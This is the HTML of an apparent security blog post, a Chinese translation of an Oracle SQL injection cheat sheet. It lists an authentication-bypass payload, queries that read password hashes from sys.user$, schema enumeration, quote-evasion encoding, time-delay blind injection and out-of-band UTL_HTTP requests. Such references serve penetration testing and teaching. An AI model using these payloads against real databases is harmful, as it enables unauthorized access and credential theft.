@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="SQLi,翻译," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="翻译：SQL注入之Oracle篇。">
+<meta name="keywords" content="SQLi,翻译">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLi Oracle 基础知识">
+<meta property="og:url" content="http://yoursite.com/2018/03/22/SQLi_ORACLE/index.html">
+<meta property="og:site_name" content="Sec-note">
+<meta property="og:description" content="翻译：SQL注入之Oracle篇。">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-03-22T06:21:40.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQLi Oracle 基础知识">
+<meta name="twitter:description" content="翻译：SQL注入之Oracle篇。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/03/22/SQLi_ORACLE/"/>
+
+
+
+
+
+  <title>SQLi Oracle 基础知识 | Sec-note</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sec-note</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/22/SQLi_ORACLE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sec-note">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-note">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQLi Oracle 基础知识</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-22T15:54:24+08:00">
+                2018-03-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/翻译/" itemprop="url" rel="index">
+                    <span itemprop="name">翻译</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>翻译：SQL注入之Oracle篇。</p>
+<a id="more"></a>
+<h4 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a><a href="https://websec.ca/kb/sql_injection#Oracle_Default_Databases" target="_blank" rel="noopener">Oracle</a></h4><h4 id="默认数据库"><a href="#默认数据库" class="headerlink" title="默认数据库"></a>默认数据库</h4><pre><code>SYSTEM    Available in all versions 所有版本
+SYSAUX    Available in all versions 所有版本
+</code></pre><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>以下的语句可以注释掉注入语句的其余部分</p>
+<pre><code>--    SQL comment
+</code></pre><p><strong>例子</strong></p>
+<pre><code>SELECT * FROM Users WHERE username = &apos;&apos; OR 1=1 --&apos; AND password = &apos;&apos;;
+</code></pre><h4 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h4><pre><code>SELECT banner FROM v$version WHERE banner LIKE &apos;Oracle%&apos;;
+SELECT banner FROM v$version WHERE banner LIKE &apos;TNS%&apos;;
+SELECT version FROM v$instance;
+</code></pre><p><strong>注意</strong></p>
+<ul>
+<li><code>Oracle</code>所有的<code>select</code>语句必须包含一个表</li>
+<li><code>dual</code>是一个虚拟的表可以被用来测试(下面的翻译可能要好)</li>
+<li><code>dual</code>是一个可用于测试的虚拟表</li>
+</ul>
+<h4 id="数据库凭证"><a href="#数据库凭证" class="headerlink" title="数据库凭证"></a>数据库凭证</h4><pre><code>SELECT username FROM all_users;    Available on all versions
+SELECT name, password from sys.user$;    Privileged, &lt;= 10g
+SELECT name, spare4 from sys.user$;    Privileged, &lt;= 11g
+</code></pre><h4 id="数据库名字"><a href="#数据库名字" class="headerlink" title="数据库名字"></a>数据库名字</h4><h5 id="当前数据库"><a href="#当前数据库" class="headerlink" title="当前数据库"></a>当前数据库</h5><pre><code>SELECT name FROM v$database;
+SELECT instance_name FROM v$instance
+SELECT global_name FROM global_name
+SELECT SYS.DATABASE_NAME FROM DUAL
+</code></pre><h5 id="用户数据库"><a href="#用户数据库" class="headerlink" title="用户数据库"></a>用户数据库</h5><pre><code>SELECT DISTINCT owner FROM all_tables;
+</code></pre><h4 id="服务器主机名字"><a href="#服务器主机名字" class="headerlink" title="服务器主机名字"></a>服务器主机名字</h4><pre><code>SELECT host_name FROM v$instance; (Privileged)
+SELECT UTL_INADDR.get_host_name FROM dual;
+SELECT UTL_INADDR.get_host_name(&apos;10.0.0.1&apos;) FROM dual;
+SELECT UTL_INADDR.get_host_address FROM dual;
+</code></pre><h4 id="表和列"><a href="#表和列" class="headerlink" title="表和列"></a>表和列</h4><p><strong>获取表</strong></p>
+<pre><code>SELECT table_name FROM all_tables;
+</code></pre><p><strong>获取列</strong></p>
+<pre><code>SELECT column_name FROM all_tab_columns;
+</code></pre><p><strong>从列名中查找表</strong></p>
+<pre><code>SELECT column_name FROM all_tab_columns WHERE table_name = &apos;Users&apos;;
+</code></pre><p><strong>从表名中查找列</strong></p>
+<pre><code>SELECT table_name FROM all_tab_tables WHERE column_name = &apos;password&apos;;
+</code></pre><p><strong>一次获取多张表</strong></p>
+<pre><code>SELECT RTRIM(XMLAGG(XMLELEMENT(e, table_name || &apos;,&apos;)).EXTRACT(&apos;//text()&apos;).EXTRACT(&apos;//text()&apos;) ,&apos;,&apos;) FROM all_tables;
+</code></pre><h4 id="逃逸引号"><a href="#逃逸引号" class="headerlink" title="逃逸引号"></a>逃逸引号</h4><p>不像其他关系型数据库，<code>Oracle</code>允许表/列名字编码</p>
+<pre><code>SELECT 0x09120911091 FROM dual;    Hex Encoding.
+SELECT CHR(32)||CHR(92)||CHR(93) FROM dual;    CHR() Function.
+</code></pre><h4 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h4><pre><code>SELECT &apos;a&apos;||&apos;d&apos;||&apos;mi&apos;||&apos;n&apos; FROM dual;
+</code></pre><h4 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h4><pre><code>SELECT CASE WHEN 1=1 THEN &apos;true&apos; ELSE &apos;false&apos; END FROM dual
+</code></pre><h4 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h4><p><strong>延迟</strong></p>
+<pre><code>SELECT UTL_INADDR.get_host_address(&apos;non-existant-domain.com&apos;) FROM dual;
+</code></pre><p><strong>严重时间延迟</strong></p>
+<pre><code>AND (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5) &gt; 0 AND 300 &gt; ASCII(SUBSTR((SELECT username FROM all_users WHERE rownum = 1),1,1));
+</code></pre><h4 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h4><pre><code>SELECT privilege FROM session_privs;
+SELECT grantee, granted_role FROM dba_role_privs; (Privileged)
+</code></pre><h4 id="带外通道"><a href="#带外通道" class="headerlink" title="带外通道"></a>带外通道</h4><p><strong>DNS 请求</strong></p>
+<pre><code>SELECT UTL_HTTP.REQUEST(&apos;http://localhost&apos;) FROM dual;
+SELECT UTL_INADDR.get_host_address(&apos;localhost.com&apos;) FROM dual;
+</code></pre><h4 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h4><p>一个<code>Metasploit</code>模块<a href="https://www.rapid7.com/db/modules/auxiliary/analyze/jtr_oracle_fast" target="_blank" rel="noopener"><code>JTR</code></a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/SQLi/" rel="tag"># SQLi</a>
+          
+            <a href="/tags/翻译/" rel="tag"># 翻译</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/21/SQLi_MSSQL/" rel="next" title="SQLi MSSQL基础知识">
+                <i class="fa fa-chevron-left"></i> SQLi MSSQL基础知识
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/26/sqlmap_os_shell/" rel="prev" title="SQLMAP --os-shell 学习">
+                SQLMAP --os-shell 学习 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Sec-note</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">60</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sie504" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle"><span class="nav-number">1.</span> <span class="nav-text">Oracle</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#默认数据库"><span class="nav-number">2.</span> <span class="nav-text">默认数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注释"><span class="nav-number">3.</span> <span class="nav-text">注释</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#版本"><span class="nav-number">4.</span> <span class="nav-text">版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据库凭证"><span class="nav-number">5.</span> <span class="nav-text">数据库凭证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据库名字"><span class="nav-number">6.</span> <span class="nav-text">数据库名字</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#当前数据库"><span class="nav-number">6.1.</span> <span class="nav-text">当前数据库</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#用户数据库"><span class="nav-number">6.2.</span> <span class="nav-text">用户数据库</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#服务器主机名字"><span class="nav-number">7.</span> <span class="nav-text">服务器主机名字</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#表和列"><span class="nav-number">8.</span> <span class="nav-text">表和列</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#逃逸引号"><span class="nav-number">9.</span> <span class="nav-text">逃逸引号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#字符串连接"><span class="nav-number">10.</span> <span class="nav-text">字符串连接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#条件语句"><span class="nav-number">11.</span> <span class="nav-text">条件语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#时间"><span class="nav-number">12.</span> <span class="nav-text">时间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#权限"><span class="nav-number">13.</span> <span class="nav-text">权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#带外通道"><span class="nav-number">14.</span> <span class="nav-text">带外通道</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#密码破解"><span class="nav-number">15.</span> <span class="nav-text">密码破解</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sec-note</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
